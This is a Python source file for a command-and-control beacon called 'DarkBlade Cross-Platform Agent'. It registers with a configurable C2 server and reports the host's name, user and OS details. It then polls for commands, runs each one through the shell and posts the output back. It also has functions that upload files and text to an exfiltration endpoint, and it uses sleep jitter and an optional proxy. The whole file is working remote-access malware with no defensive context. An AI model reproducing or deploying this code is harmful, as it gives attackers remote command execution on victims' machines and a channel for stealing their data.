#!/usr/bin/env python3
# DarkBlade Cross-Platform Agent (Linux/macOS/Windows via Python)
# Features: register, periodic check-in, command exec, result post, sysinfo push,
# file exfil (multipart or JSON), optional proxy, jitter, graceful backoff.

import os
import sys
import time
import json
import platform
import subprocess
import hashlib
import random
from typing import Dict, Any, Optional

import requests

C2 = os.environ.get("DB_C2", "http://127.0.0.1:8443").rstrip("/")
SLEEP = int(os.environ.get("DB_SLEEP", "60"))
JITTER = int(os.environ.get("DB_JITTER", "30"))  # add 0..JITTER seconds
API_KEY = os.environ.get("DB_API_KEY", "")  # optional X-API-Key header if needed
PROXY = os.environ.get("DB_PROXY", "").strip()  # e.g. http://127.0.0.1:8080
TIMEOUT = int(os.environ.get("DB_TIMEOUT", "15"))

session = requests.Session()
if PROXY:
    session.proxies.update({
        "http": PROXY,
        "https": PROXY,
    })

headers = {}
if API_KEY:
    headers["X-API-Key"] = API_KEY


def gen_beacon_id() -> str:
    uid = f"{platform.node()}{os.getuid() if hasattr(os, 'getuid') else 0}{time.time()}"
    return hashlib.md5(uid.encode()).hexdigest()  # 32 hex


def collect_sysinfo() -> Dict[str, Any]:
    info = {
        "hostname": platform.node(),
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "os": platform.system(),
        "os_version": platform.release(),
        "arch": platform.machine(),
        "python": platform.python_version(),
        "env": {
            "path": os.getenv("PATH", ""),
        }
    }
    return info


def post_json(url: str, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    try:
        r = session.post(url, json=data, headers=headers, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except Exception:
        return None


def post_file(url: str, filepath: str, filename: Optional[str] = None, meta: Optional[Dict[str, Any]] = None) -> bool:
    try:
        fname = filename or os.path.basename(filepath)
        with open(filepath, 'rb') as f:
            files = {"file": (fname, f)}
            data = {"type": "file"}
            if meta:
                data.update(meta)
            r = session.post(url, files=files, data=data, headers=headers, timeout=TIMEOUT)
            r.raise_for_status()
            return True
    except Exception:
        return False


class Agent:
    def __init__(self, c2_base: str):
        self.c2 = c2_base
        self.beacon_id = gen_beacon_id()

    def register(self) -> bool:
        payload = {
            "beacon_id": self.beacon_id,
            **collect_sysinfo(),
            "metadata": {}
        }
        resp = post_json(f"{self.c2}/api/beacon/register", payload)
        return bool(resp and resp.get("status") == "success")

    def sysinfo_push(self) -> None:
        info = collect_sysinfo()
        # Try dedicated endpoint; fall back to encrypted exfil path
        resp = post_json(f"{self.c2}/api/beacon/sysinfo", {
            "beacon_id": self.beacon_id,
            "sysinfo": info
        })
        if resp is None:
            # fallback via exfil as JSON
            data = json.dumps(info).encode()
            post_json(f"{self.c2}/api/beacon/exfil/{self.beacon_id}", {
                "filename": "sysinfo.json",
                "data": info,
                "type": "sysinfo"
            })

    def checkin(self) -> Any:
        resp = post_json(f"{self.c2}/api/beacon/checkin/{self.beacon_id}", {})
        if not resp:
            return []
        return resp.get("commands", [])

    def send_result(self, command_id: int, result: str) -> None:
        post_json(f"{self.c2}/api/beacon/result/{command_id}", {"result": result[-100000:]})

    def exfil_text(self, name: str, text: str, data_type: str = "text") -> bool:
        data = {
            "filename": name,
            "data": text,
            "type": data_type
        }
        return bool(post_json(f"{self.c2}/api/beacon/exfil/{self.beacon_id}", data))

    def exfil_file(self, path: str, alias: Optional[str] = None) -> bool:
        return post_file(f"{self.c2}/api/beacon/exfil/{self.beacon_id}", path, alias)

    @staticmethod
    def exec_command(cmd: str) -> str:
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            out = p.stdout or ""
            if p.stderr:
                out += f"\n[STDERR]\n{p.stderr}"
            return out or "[no output]"
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as e:
            return f"[error] {e}"

    def run(self) -> None:
        if not self.register():
            time.sleep(10)
        self.sysinfo_push()
        base_sleep = SLEEP
        while True:
            try:
                cmds = self.checkin()
                for c in cmds:
                    cid = c.get("id")
                    cmd = c.get("command", "")
                    out = self.exec_command(cmd)
                    self.send_result(cid, out)
            except Exception:
                time.sleep(5)
            # jitter
            time.sleep(base_sleep + (random.randint(0, JITTER) if JITTER > 0 else 0))


def main():
    a = Agent(C2)
    a.run()


if __name__ == "__main__":
    main()
